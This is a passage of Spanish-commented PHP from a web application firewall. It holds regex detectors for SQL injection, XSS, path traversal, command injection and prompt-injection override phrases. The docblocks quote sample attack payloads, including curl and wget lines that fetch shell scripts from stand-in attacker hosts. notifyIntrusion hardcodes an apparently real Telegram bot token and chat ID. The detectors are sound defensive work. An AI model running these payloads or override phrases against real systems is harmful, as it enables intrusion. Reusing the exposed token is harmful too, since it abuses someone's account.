            $this->renderBlockedPage($this->ip, $data['expires'], $data['city'], $data['country']);
            return;
        }
        // 2. Si no está en Redis, buscar en MySQL
        $blocked = Capsule::table('waf_blocked_ips_szm')
            ->where('ip_address', $this->ip)
            ->where('is_banned', 1)
            ->first();

        if ($blocked) {
            if (strtotime($blocked->ban_until) > time()) {
                if ($this->redis) {
                    $ttl = strtotime($blocked->ban_until) - time();
                    $this->redis->setex($cacheKey, $ttl, json_encode([
                        'expires' => $blocked->ban_until,
                        'city' => $blocked->city,
                        'country' => $blocked->country
                    ]));
                }
                $this->renderBlockedPage($this->ip, $blocked->ban_until, $blocked->city, $blocked->country);
            } else {
                // Si el baneo expiró en MySQL, nos aseguramos de que no haya basura en Redis
                if ($this->redis) {
                    $this->redis->del($cacheKey);
                }
                Capsule::table('waf_blocked_ips_szm')
                    ->where('ip_address', $this->ip)
                    ->update([
                        'is_banned' => 0,
                        'attempts' => 0,
                        'reason' => 'Ban expired'
                    ]);
            }
        }
    }

    protected function renderBlockedPage(string $ip, string $expires, string $city, string $country): void
    {
        http_response_code(403);

        // Usamos el contenedor para renderizar la vista profesional. //'errors/waf_blocked.twig', [
        echo \Core\ServicesContainer::twig()->render('waf/errors/waf_blocked.twig', [
            'ip' => $ip,
            'city' => $city,
            'country' => $country,
            'expires' => $expires,
            'reference_id' => substr(md5($ip), 0, 8) // Un ID único para que el usuario te lo reporte
        ]);

        exit;
    }

    /**
     * Detecta payloads potencialmente generados por IA o ataques de Prompt Injection.
     *
     * Esta función analiza entradas del usuario para identificar patrones asociados
     * con:
     *
     * 1. Payloads complejos de SQL Injection generados por IA
     * 2. Intentos de Prompt Injection dirigidos a manipular la lógica del sistema
     *    o el comportamiento de modelos de lenguaje integrados en la aplicación.
     *
     * Flujo de detección:
     *
     * 1. Filtrado inicial por longitud:
     *    - Se ignoran valores menores a 10 caracteres para reducir consumo de CPU.
     *
     * 2. Detección de SQL generado por IA:
     *    - Si el payload supera los 250 caracteres, se analiza si contiene:
     *        • Palabras clave SQL comunes (SELECT, UNION, DROP, INSERT, etc.)
     *        • Comentarios SQL usados en bypass
     *    - Este patrón suele aparecer en payloads largos generados por
     *      herramientas automatizadas o modelos de IA.
     *    - Si se detecta, se bloquea inmediatamente la solicitud.
     *
     * 3. Detección de Prompt Injection:
     *    - Se buscan frases que intentan manipular instrucciones del sistema,
     *      típicas en ataques contra aplicaciones que integran modelos de IA.
     *
     *    Ejemplos de intentos detectados:
     *
     *      "ignore previous instructions"
     *      "you are now an admin"
     *      "override system rules"
     *      "print the source code"
     *      "muestrame la configuracion"
     *
     *    Estas frases intentan:
     *      • alterar el comportamiento del sistema
     *      • obtener información sensible
     *      • escalar privilegios lógicos
     *
     * 4. Si se detecta un Prompt Injection:
     *      - Se incrementa el riesgo de la IP mediante `addRiskScore()`
     *      - Se bloquea la solicitud mediante `block()`
     *
     * Este mecanismo añade una capa de protección contra ataques dirigidos
     * a sistemas que utilizan IA o automatización avanzada.
     *
     * @param string $ip Dirección IP del cliente que envía el payload.
     * @param string $value Valor de entrada que será analizado.
     *
     * @return void
     */
    protected function detectAiPayloads(string $ip, string $value): void
    {
        $length = strlen($value);
        if ($length < 10) return; // Ignoramos valores muy cortos para ahorrar CPU

        // 1. TU LÓGICA ACTUAL: SQL generado por IA (Estructuras complejas > 250 chars)
        if ($length > 250) {
            if (
                preg_match('/(select|union|drop|insert|sleep|benchmark)/i', $value) &&
                preg_match('/(--|#|\/\*|\*\/)/', $value)
            ) {
                $this->block("ai_generated_sql_payload", "payload", $value, $ip, true);
                return;
            }
        }

        // 2. NUEVA LÓGICA: Prompt Injection (Ataques al "razonamiento" del sistema)
        // Buscamos intentos de "reprogramar" o "resetear" la lógica de la App
        $aiIntentPatterns = [
            '/(ignore|forget|override|bypass|system)\s+(all|previous|last|current)\s+(instructions|prompts|rules|orders)/i',
            '/(ignora|olvida|anula|omite|sistema)\s+(todas|las|anteriores)\s+(instrucciones|reglas|órdenes)/i',
            '/you\s+are\s+now\s+(an\s+admin|root|god\s+mode|unrestricted)/i',
            '/ahora\s+eres\s+(administrador|root|modo\s+dios|sin\s+restricciones)/i',
            '/print\s+the\s+(source\s+code|config|\.env|passwords)/i',
            '/muestrame\s+(el\s+codigo|la\s+configuracion|las\s+claves)/i'
        ];

        foreach ($aiIntentPatterns as $pattern) {
            if (preg_match($pattern, $value)) {
                // Estos ataques no necesitan ser largos para ser peligrosos
                $this->addRiskScore($ip, 15, "ai_prompt_injection_detected");
                $this->block("ai_prompt_injection", "input_field", $value, $ip, true);
                return;
            }
        }
    }

    /**
     * Normaliza una entrada para facilitar la detección de payloads maliciosos.
     *
     * Muchos ataques web utilizan técnicas de evasión como:
     *  - URL encoding múltiple
     *  - HTML entities
     *  - Null bytes
     *  - estructuras complejas (arrays)
     *
     * Esta función intenta convertir la entrada a una forma "normalizada"
     * antes de aplicar reglas de detección (XSS, SQLi, Command Injection, etc.).
     *
     * Proceso de normalización:
     *
     * 1. Si el valor es un array:
     *    - Se convierte a JSON para poder analizarlo como string.
     *
     * 2. Decodificación múltiple (hasta 3 veces):
     *    - `urldecode()` → detecta payloads codificados como:
     *          %3Cscript%3E
     *          ..%2F..%2Fetc/passwd
     *
     *    - `html_entity_decode()` → detecta entidades HTML como:
     *          &lt;script&gt;
     *
     *    Esto se repite 3 veces para manejar casos de doble o triple encoding
     *    usados frecuentemente para evadir filtros de seguridad.
     *
     * 3. Eliminación de Null Bytes:
     *    - Algunos ataques utilizan `\0` o `0x00` para truncar strings
     *      o evadir comparaciones.
     *
     * Ejemplos de normalización:
     *
     *      "%253Cscript%253Ealert(1)%253C/script%253E"
     *      → "%3Cscript%3Ealert(1)%3C/script%3E"
     *      → "<script>alert(1)</script>"
     *
     *      "..%252f..%252fetc/passwd"
     *      → "..%2f..%2fetc/passwd"
     *      → "../../etc/passwd"
     *
     * Esta función es clave para mejorar la efectividad de las reglas
     * de detección del WAF.
     *
     * @param mixed $value Valor de entrada (string o array).
     *
     * @return string
     *      Valor normalizado listo para ser analizado por las reglas de seguridad.
     */
    protected function normalize($value): string
    {
        if (is_array($value)) {
            return json_encode($value);
        }
        $clean = $value;
        for ($i = 0; $i < 3; $i++) {
            $clean = urldecode($clean);
            $clean = html_entity_decode($clean);
        }
        $clean = str_replace(['\0', "\x00"], '', $clean);

        return $clean;
    }

    /**
     * Obtiene información geográfica básica asociada a una dirección IP,
     * utilizando cache en Redis para evitar consultas repetidas a APIs externas.
     *
     * Esta función consulta el servicio `ip-api.com` para recuperar datos
     * de geolocalización e ISP de una IP. Antes de realizar la consulta externa,
     * intenta obtener los datos desde Redis para mejorar el rendimiento
     * y reducir la latencia del WAF.
     *
     * Flujo de ejecución:
     *
     * 1. Verifica si la IP corresponde a localhost (`127.0.0.1` o `::1`).
     *    - En ese caso retorna un resultado simplificado.
     *
     * 2. Genera una clave de cache en Redis con el formato:
     *        waf:geo:{ip}
     *
     * 3. Intenta recuperar los datos desde Redis:
     *    - Si existen, los devuelve inmediatamente.
     *
     * 4. Si no están en cache:
     *    - Consulta el API externo `ip-api.com`
     *    - Se solicita únicamente:
     *          status
     *          country
     *          city
     *          isp
     *
     * 5. Si la respuesta es válida:
     *    - Se almacena en Redis por 24 horas (86400 segundos)
     *    - Esto evita repetir consultas innecesarias.
     *
     * 6. Si ocurre cualquier error (timeout, conexión fallida,
     *    JSON inválido, etc.), se devuelve un arreglo vacío para
     *    no interrumpir el flujo del WAF.
     *
     * Optimización aplicada:
     * - Timeout reducido a 1 segundo para evitar bloqueos.
     * - Cache en Redis por 24 horas.
     *
     * Ejemplo de respuesta:
     *
     * [
     *   "status"  => "success",
     *   "country" => "Mexico",
     *   "city"    => "Hermosillo",
     *   "isp"     => "Telmex"
     * ]
     *
     * @param string $ip Dirección IP a consultar (IPv4 o IPv6).
     *
     * @return array
     *      Información geográfica e ISP asociada a la IP.
     *      Devuelve un arreglo vacío si no se pudo obtener información.
     */
    protected function getIpDetails(string $ip): array
    {
        if ($ip === '127.0.0.1' || $ip === '::1') return ['city' => 'Localhost'];

        $cacheKey = "waf:geo:{$ip}";

        // 1. Intentar recuperar de Redis
        if ($this->redis && $this->redis->exists($cacheKey)) {
            return json_decode($this->redis->get($cacheKey), true);
        }

        try {
            $ctx = stream_context_create(['http' => ['timeout' => 1]]); // Bajamos a 1s
            $res = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp", false, $ctx);
            $data = json_decode($res, true) ?? [];

            // 2. Guardar en Redis por 24 horas para no repetir la consulta
            if (!empty($data) && $this->redis) {
                $this->redis->setex($cacheKey, 86400, json_encode($data));
            }

            return $data;
        } catch (\Throwable $e) {
            return [];
        }
    }

    /**
     * Obtiene información geográfica y de red asociada a una dirección IP.
     *
     * Esta función consulta el servicio externo `ip-api.com` para recuperar
     * datos básicos de geolocalización y proveedor de red (ISP) de una IP.
     * La información puede ser utilizada por el WAF para:
     *
     * - análisis de comportamiento por región
     * - registro de logs de ataques
     * - detección de patrones sospechosos por país o proveedor
     * - inteligencia de amenazas
     *
     * Datos solicitados al API:
     *      - status   → estado de la consulta
     *      - country  → país de origen de la IP
     *      - city     → ciudad
     *      - isp      → proveedor de internet
     *      - lat      → latitud
     *      - lon      → longitud
     *
     * Comportamiento especial:
     *
     * 1. Si la IP corresponde a localhost (`127.0.0.1` o `::1`),
     *    se devuelve inmediatamente un resultado simplificado.
     *
     * 2. Se usa un timeout de 2 segundos para evitar que la consulta
     *    bloquee la ejecución del WAF si el servicio externo no responde.
     *
     * 3. Si ocurre cualquier error durante la consulta (timeout,
     *    conexión fallida, respuesta inválida, etc.), la función
     *    devuelve un arreglo vacío para evitar interrupciones en
     *    el flujo de la aplicación.
     *
     * Ejemplo de respuesta del API:
     *
     *      [
     *          "status"  => "success",
     *          "country" => "Mexico",
     *          "city"    => "Hermosillo",
     *          "isp"     => "Telmex",
     *          "lat"     => 29.0729,
     *          "lon"     => -110.9559
     *      ]
     *
     * @param string $ip Dirección IP a consultar (IPv4 o IPv6).
     *
     * @return array
     *      Arreglo asociativo con la información de la IP.
     *      Puede devolver un arreglo vacío si ocurre un error.
     */
    protected function getIpDetailsBasica(string $ip): array
    {
        if ($ip === '127.0.0.1' || $ip === '::1') return ['city' => 'Localhost'];
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $res = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,lat,lon", false, $ctx);
            return json_decode($res, true) ?? [];
        } catch (\Throwable $e) {
            return [];
        }
    }

    /* ================= REGLAS DE DETECCIÓN ================= */

    /**
     * Motor de detección de SQL Injection.
     * * Identifica patrones de UNION SELECT, ataques lógicos (OR 1=1),
     * y funciones de tiempo (SLEEP/BENCHMARK).
     * * @param string $v El valor a evaluar.
     * @return bool True si se detecta un patrón malicioso.
     */
    protected function sql_injection($v): bool
    {
        $patterns = [
            // 1. Uniones y extracciones (el más común)
            '/union\s+(all\s+)?select/i',
            // 2. Ataques lógicos (OR 1=1, AND 'a'='a', etc.)
            '/(\b(OR|AND)\b)\s+([\'"]?\w+[\'"]?)\s*=\s*\3/i',
            // 3. Blind SQLi (Inyecciones basadas en tiempo)
            '/(sleep\(|benchmark\s*\(|pg_sleep\(|waitfor\s+delay)/i',
            // 4. Comentarios y terminaciones de sentencia
            '/(--|\/\*|\*\/|#|;)\s*$/i',
            // 5. Funciones críticas y manipulación de DB
            '/\b(drop|truncate|delete|insert|update|concat|char|load_file|into\s+outfile)\b/i',
            // 6. Detección de Hexadecimales (usados para evadir filtros de texto)
            '/0x[0-9a-fA-F]{2,}/'
        ];

        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $v)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Detecta posibles intentos de Cross-Site Scripting (XSS) en una cadena.
     *
     * El ataque XSS ocurre cuando un atacante inyecta código JavaScript u otros
     * scripts maliciosos en una aplicación web con el objetivo de ejecutarlos
     * en el navegador de otros usuarios. Esto puede permitir robo de cookies,
     * secuestro de sesión o manipulación del DOM.
     *
     * Esta función utiliza una expresión regular para detectar patrones
     * comúnmente utilizados en ataques XSS, incluyendo:
     *
     * 1. Etiquetas <script>
     * 2. Protocolo javascript:
     * 3. Atributos de eventos HTML (onload=, onclick=, onerror=, etc.)
     * 4. Funciones JavaScript usadas frecuentemente en pruebas o exploits:
     *      - alert()
     *      - confirm()
     * 5. Acceso a cookies mediante document.cookie
     *
     * Ejemplos de payloads detectados:
     *
     *      <script>alert(1)</script>
     *      javascript:alert(1)
     *      <img src=x onerror=alert(1)>
     *      <body onload=alert(1)>
     *      <script>document.cookie</script>
     *
     * Si se detecta alguno de estos patrones, la función devuelve `1` (true),
     * indicando un posible intento de XSS.
     *
     * Ejemplo de uso dentro del WAF:
     *
     *      if ($this->xss($input)) {
     *          $this->addRiskScore($this->ip, 15, 'xss_attempt');
     *      }
     *
     * @param string $v Valor de entrada a analizar (GET, POST, URI, headers, etc).
     *
     * @return int|false
     *         - 1 si se detecta un patrón sospechoso de XSS.
     *         - 0 o false si no se detecta.
     */
    protected function xss($v)
    {
        return preg_match('/(<script|javascript:|on\w+\s*=|alert\(|confirm\(|document\.cookie)/i', $v);
    }

    /**
     * Detecta posibles intentos de Path Traversal en una cadena.
     *
     * El ataque de Path Traversal (también conocido como Directory Traversal)
     * intenta acceder a archivos fuera del directorio permitido utilizando
     * secuencias como "../" o "..\" para navegar hacia directorios superiores.
     *
     * Este tipo de ataque se utiliza comúnmente para intentar acceder a archivos
     * sensibles del sistema como:
     *
     *      /etc/passwd
     *      /etc/shadow
     *      C:\Windows\system.ini
     *      C:\Windows\win.ini
     *
     * La función busca patrones típicos utilizados para subir en la estructura
     * de directorios:
     *
     *      ../   (Unix/Linux)
     *      ..\   (Windows)
     *
     * Ejemplos de payloads detectados:
     *
     *      ../../etc/passwd
     *      ../../../config.php
     *      ..\..\Windows\system32\drivers\etc\hosts
     *
     * Si se detecta alguno de estos patrones, la función devuelve `1` (true),
     * indicando un posible intento de Path Traversal.
     *
     * Ejemplo de uso dentro del WAF:
     *
     *      if ($this->path_traversal($input)) {
     *          $this->addRiskScore($this->ip, 15, 'path_traversal_attempt');
     *      }
     *
     * @param string $v Valor de entrada que se desea analizar (GET, POST, URI, etc).
     *
     * @return int|false
     *         - 1 si se detecta un patrón de path traversal.
     *         - 0 o false si no se detecta.
     */
    protected function path_traversal($v)
    {
        return preg_match('/(\.\.\/|\.\.\\\\)/', $v);
    }

    /**
     * Detecta posibles intentos de Command Injection en un valor dado.
     *
     * Esta función analiza una cadena buscando patrones típicos usados en
     * ataques de inyección de comandos del sistema operativo. Estos ataques
     * intentan ejecutar comandos del sistema a través de entradas no validadas
     * en formularios, parámetros GET/POST, headers, etc.
     *
     * La detección se basa en una expresión regular que busca:
     *
     * 1. Comandos comunes del sistema utilizados en ataques:
     *      - cat
     *      - ls
     *      - whoami
     *      - pwd
     *      - curl
     *      - wget
     *
     * 2. Seguidos de operadores típicos de ejecución o encadenamiento de comandos:
     *      - ;
     *      - |
     *      - `
     *      - >
     *
     * Ejemplos de payloads detectados:
     *
     *      cat /etc/passwd;
     *      ls -la | grep root
     *      whoami`
     *      curl http://attacker.com/shell.sh;
     *      wget http://evil.com/malware.sh
     *
     * Si se detecta un patrón sospechoso, la función devuelve `1` (true),
     * indicando un posible intento de inyección de comandos.
     *
     * Ejemplo de uso en el WAF:
     *
     *      if ($this->command_injection($input)) {
     *          $this->addRiskScore($this->ip, 15, 'command_injection_attempt');
     *      }
     *
     * @param string $v Valor a analizar (entrada del usuario).
     *
     * @return int|false
     *         - 1 si se detecta un patrón sospechoso.
     *         - 0 o false si no se detecta.
     */
    protected function command_injection($v)
    {
        return preg_match('/\b(cat|ls|whoami|pwd|curl|wget)\b.*[;|\||`|>]/i', $v);
    }


    /**
     * ========== SECCION DE MANTENIMIENTO ===========
     */

    /**
     * Ejecuta tareas de mantenimiento preventivo del WAF.
     *
     * Esta función limpia datos temporales o caducados para mantener
     * la base de datos pequeña, rápida y eficiente. Se recomienda
     * ejecutarla periódicamente mediante un Cron.
     *
     * Tareas realizadas:
     *
     * 1. Limpieza de logs de ataques antiguos
     *    - Elimina registros de la tabla `waf_attack_logs_szm`
     *    - Solo se conservan los últimos 30 días de historial.
     *
     * 2. Limpieza de registros de Rate Limiting
     *    - Borra solicitudes registradas en `waf_requests_szm`
     *    - Se eliminan las entradas de más de 1 hora ya que
     *      el sistema de rate limit trabaja por minuto.
     *
     * 3. Desbloqueo automático de IPs/Fingerprints
     *    - Busca entradas en `waf_blocked_ips_szm` cuyo tiempo
     *      de baneo (`ban_until`) ya expiró.
     *    - Restablece el estado del bloqueo:
     *        - is_banned = 0
     *        - attempts = 0
     *        - reason actualizado indicando limpieza automática.
     *
     * 4. Actualización opcional de inteligencia Cloud
     *    - Si `$updateCloudData` es `true`, descarga nuevamente
     *      los rangos oficiales de proveedores cloud (AWS, Google, etc.)
     *      mediante `updateCloudRanges()`.
     *    - Esto permite mantener actualizada la detección de
     *      infraestructuras cloud utilizadas frecuentemente en ataques.
     *
     * Recomendación de uso:
     *
     * Ejecutar mediante Cron cada cierto tiempo, por ejemplo:
     *
     * - Mantenimiento general cada 10–30 minutos
     * - Actualización de rangos cloud 1 vez al día
     *
     * Ejemplo:
     * ```
     * $waf->maintenance();          // mantenimiento normal
     * $waf->maintenance(true);      // mantenimiento + actualización cloud
     * ```
     *
     * @param bool $updateCloudData Indica si se debe actualizar la
     *                              inteligencia de rangos cloud.
     *
     * @return void
     */
    public function maintenance(bool $updateCloudData = false): void
    {
        // 1. Borrar logs de ataques antiguos (más de 30 días)
        // Estos ya no son necesarios para el día a día, solo ocupan espacio.
        Capsule::table('waf_attack_logs_szm')
            ->where('created_at', '<', date('Y-m-d H:i:s', strtotime('-30 days')))
            ->delete();

        // 2. Limpiar el historial de rate limit (más de 1 hora)
        // Como el rate limit es por minuto, tener datos de hace una hora es innecesario.
        Capsule::table('waf_requests_szm')
            ->where('created_at', '<', date('Y-m-d H:i:s', strtotime('-1 hour')))
            ->delete();

        // 3. Desbloquear IPs/Fingerprints cuyo baneo ya expiró
        // Esto mantiene la tabla de bloqueos pequeña y eficiente.
        Capsule::table('waf_blocked_ips_szm')
            ->where('is_banned', 1)
            ->where('ban_until', '<', date('Y-m-d H:i:s'))
            ->update([
                'is_banned' => 0,
                'risk_score' => 0, // <-- CAMBIADO: Antes decía 'attempts'
                'reason' => 'Ban expired and cleaned by maintenance'
            ]);

        // 4. NUEVO: Actualización de Inteligencia de Nube
        // Solo se ejecuta si pasas el flag 'true' manualmente o vía Cron
        if ($updateCloudData) {
            $this->updateCloudRanges();
            error_log("[WAF-SYSTEM] Inteligencia de rangos Cloud actualizada.");
        }

        error_log("[WAF-SYSTEM] Mantenimiento preventivo completado.");
    }

    /**
     * Descarga y actualiza los rangos de IP oficiales de proveedores cloud
     * (AWS, Google y Google Cloud) y los almacena en la base de datos.
     *
     * Flujo del proceso:
     * 1. Define los proveedores y sus endpoints oficiales de rangos IP.
     * 2. Limpia la tabla `waf_cloud_ranges_szm` para evitar duplicados o datos obsoletos.
     * 3. Descarga los archivos JSON de cada proveedor.
     * 4. Extrae los rangos CIDR IPv4 e IPv6.
     * 5. Convierte cada CIDR en límites binarios (ip_start / ip_end) usando `formatRange()`.
     * 6. Inserta los resultados en la base de datos en bloques de 500 registros
     *    para evitar saturación del motor SQL.
     *
     * Esta información es utilizada por el WAF para detectar si una IP
     * pertenece a infraestructuras cloud conocidas (AWS, Google, etc.),
     * lo cual puede ayudar a aplicar reglas de seguridad más específicas.
     *
     * @return void
     */
    public function updateCloudRanges(): void
    {
        $providers = [
            'aws' => 'https://ip-ranges.amazonaws.com/ip-ranges.json',
            'google' => 'https://www.gstatic.com/ipranges/goog.json',
            'cloud' => 'https://www.gstatic.com/ipranges/cloud.json'
        ];

        // Limpiar tabla antes de actualizar
        Capsule::table('waf_cloud_ranges_szm')->truncate();

        foreach ($providers as $name => $url) {
            try {
                $ctx = stream_context_create(['http' => ['timeout' => 5]]);
                $data = json_decode(file_get_contents($url, false, $ctx), true);

                if (!$data) continue;

                $batch = [];

                // Procesamiento específico para AWS
                if ($name === 'aws') {
                    foreach ($data['prefixes'] as $item) {
                        $batch[] = $this->formatRange($name, $item['ip_prefix']);
                    }

                    foreach ($data['ipv6_prefixes'] as $item) {
                        $batch[] = $this->formatRange($name, $item['ipv6_prefix']);
                    }
                }

                // Procesamiento para Google y Google Cloud
                if ($name === 'google' || $name === 'cloud') {
                    foreach ($data['prefixes'] as $item) {
                        $prefix = $item['ipv4Prefix'] ?? $item['ipv6Prefix'] ?? null;

                        if ($prefix) {
                            $batch[] = $this->formatRange($name, $prefix);
                        }
                    }
                }

                // Insertar en bloques para optimizar rendimiento
                foreach (array_chunk($batch, 500) as $chunk) {
                    Capsule::table('waf_cloud_ranges_szm')->insert($chunk);
                }

            } catch (\Exception $e) {
                error_log("WAF Update Error [$name]: " . $e->getMessage());
            }
        }
    }

    /**
     * Convierte un rango CIDR (IPv4 o IPv6) en límites binarios utilizables
     * para consultas rápidas en base de datos.
     *
     * Ejemplo:
     *   Entrada: 192.168.1.0/24
     *   Salida:
     *      ip_start = 192.168.1.0
     *      ip_end   = 192.168.1.255
     *
     * Este método:
     * - Detecta automáticamente si el rango es IPv4 o IPv6.
     * - Convierte la IP base a formato binario usando inet_pton().
     * - Genera la máscara de red correspondiente al CIDR.
     * - Calcula el inicio y fin del rango de direcciones.
     *
     * Los valores `ip_start` e `ip_end` se almacenan en formato binario
     * para permitir búsquedas rápidas mediante comparaciones en SQL.
     *
     * @param string $provider Nombre del proveedor cloud (aws, google, cloud)
     * @param string $cidr Rango IP en formato CIDR (ej: 192.168.1.0/24 o 2001:db8::/32)
     *
     * @return array{
     *     provider: string,
     *     ip_range: string,
     *     ip_start: string,
     *     ip_end: string
     * }
     */
    protected function formatRange(string $provider, string $cidr): array
    {
        list($ip, $mask) = explode('/', $cidr);

        $isV6 = str_contains($ip, ':');
        $addr = inet_pton($ip);
        $maskArray = str_repeat("\xff", $isV6 ? 16 : 4);

        $bits = $isV6 ? 128 : 32;
        $bytes = $isV6 ? 16 : 4;
        $maskLength = (int)$mask;

        for ($i = $bits - 1; $i >= $maskLength; $i--) {
            $byte = (int)($i / 8);
            $bit = $i % 8;
            $maskArray[$byte] = $maskArray[$byte] & chr(~(1 << $bit));
        }

        $ipStart = $addr & $maskArray;
        $ipEnd = $addr | (~$maskArray & str_repeat("\xff", $bytes));

        return [
            'provider' => $provider,
            'ip_range' => $cidr,
            'ip_start' => $ipStart,
            'ip_end' => $ipEnd
        ];
    }

    /**
     * Detecta patrones de navegación sospechosos basados en "Inference Jump".
     *
     * Esta técnica busca identificar clientes que intentan acceder directamente
     * a endpoints internos o APIs sin haber pasado por las páginas de entrada
     * normales del sistema (por ejemplo `/` o `/login`).
     *
     * Funcionamiento:
     *
     * 1. Obtiene el historial reciente de rutas (`uri`) visitadas por la IP actual
     *    en los últimos 30 segundos desde la tabla `waf_requests_szm`.
     *
     * 2. Si el historial tiene menos de 3 solicitudes, se considera insuficiente
     *    para inferir un patrón de comportamiento y la función termina.
     *
     * 3. Analiza si el usuario pasó por alguna página de entrada típica:
     *      - `/`
     *      - cualquier URI que contenga `login`
     *
     * 4. Obtiene la última página visitada.
     *
     * 5. Si se detecta que:
     *      - el cliente NO pasó por una página de entrada
     *      - y accede directamente a un endpoint `/api/`
     *
     *    entonces se considera un posible "salto de inferencia", que puede
     *    indicar:
     *      - bots explorando endpoints
     *      - scrapers
     *      - herramientas automatizadas
     *      - intentos de bypass del flujo normal de navegación
     *
     * 6. Se incrementa el riesgo del cliente usando `addRiskScore()`
     *    con un valor de 10 puntos.
     *
     * Este mecanismo permite al WAF detectar comportamientos anómalos
     * sin depender únicamente de firmas o reglas estáticas.
     *
     * Ejemplo de patrón detectado:
     *
     *      /api/users
     *      /api/users/123
     *      /api/internal/config
     *
     * Sin haber visitado previamente:
     *
     *      /
     *      /login
     *
     * @return void
     */
    protected function detectInferencePatterns(): void
    {
        // Obtenemos las últimas 5 rutas visitadas por esta IP en los últimos 30 segundos
        $history = Capsule::table('waf_requests_szm')
            ->where('ip_address', $this->ip)
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-30 seconds')))
            ->orderBy('created_at', 'asc')
            ->pluck('uri')
            ->toArray();

        if (count($history) < 3) return;

        // Lógica de "Salto de Inferencia":
        // Si la IP accede a una API profunda sin haber pasado por el root o el login
        $hasEntryPage = false;
        foreach ($history as $uri) {
            if ($uri === '/' || str_contains($uri, 'login')) {
                $hasEntryPage = true;
                break;
            }
        }

        $lastPage = end($history);
        if (!$hasEntryPage && str_contains($lastPage, '/api/')) {
            $this->addRiskScore($this->ip, 10, "suspicious_inference_jump: $lastPage");
        }
    }

    /* ================= TELEGRAM NOTIFICATION ========  */
    protected function notifyIntrusion(string $ip, string $rule, string $payload, array $geo): void
    {
        $token = "8095427215:AAGVqDSBBuqGWuG-NwPoUCzHGLRWBda02wI";
        $chatId = "952711507";

        $mensaje = "🚨 *INTENTO DE INTRUSIÓN DETECTADO* 🚨\n\n";
        $mensaje .= "👤 *IP:* `{$ip}`\n";
        $mensaje .= "🌍 *Origen:* {$geo['city']}, {$geo['country']}\n";
        $mensaje .= "🛡️ *Regla:* `{$rule}`\n";
        $mensaje .= "📥 *Payload:* `{$payload}`\n";
        $mensaje .= "🕒 *Hora:* " . date('d/m/Y H:i:s') . "\n\n";
        $mensaje .= "⚠️ _La IP ha sido bloqueada automáticamente._";

        $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatId}&text=" . urlencode($mensaje) . "&parse_mode=Markdown";

        //$cmd = "curl -s " . escapeshellarg($url) . " > /dev/null 2>&1 &";
        //\exec($cmd);

        // Usamos un timeout corto para no alentar el sistema si Telegram falla
        $ctx = stream_context_create(['http' => ['timeout' => 3]]);
        @file_get_contents($url, false, $ctx);
    }
}

/*
 CREATE TABLE waf_blocked_ips_szm (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    fingerprint VARCHAR(64) NULL,      -- Tu ID único de navegador
    risk_score INT DEFAULT 0,          -- Puntos acumulados (0 a 20+)
    is_banned TINYINT(1) DEFAULT 0,    -- 1 si ya no puede pasar
    ban_until DATETIME NULL,           -- Fecha de liberación

    -- Geolocalización
    city VARCHAR(100) DEFAULT 'Unknown',
    country VARCHAR(100) DEFAULT 'Unknown',
    isp VARCHAR(150) DEFAULT 'Unknown',

    -- Auditoría
    reason TEXT NULL,                  -- Historial: "ai_scraper: gptbot | fake_browser"
    last_attempt DATETIME NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

    INDEX(ip_address),
    INDEX(fingerprint),
    INDEX(is_banned)
);




CREATE TABLE waf_attack_logs_szm (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45),
    fingerprint VARCHAR(64),
    user_agent TEXT,
    rule_triggered VARCHAR(100),
    parameter VARCHAR(100),
    payload TEXT,
    uri VARCHAR(255),
    created_at DATETIME,

    INDEX(ip_address),
    INDEX(rule_triggered),
    INDEX(created_at)
);

CREATE TABLE waf_requests_szm (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    uri VARCHAR(255) NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

    INDEX(ip_address),
    INDEX(created_at)
);

CREATE TABLE waf_cloud_ranges_szm (
    id INT AUTO_INCREMENT PRIMARY KEY,
    provider VARCHAR(50),
    ip_range VARCHAR(50), -- Ejemplo: '3.5.140.0/22'
    ip_start VARBINARY(16), -- Versión binaria para búsqueda rápida
    ip_end VARBINARY(16),
    INDEX(ip_start, ip_end)
);

 * */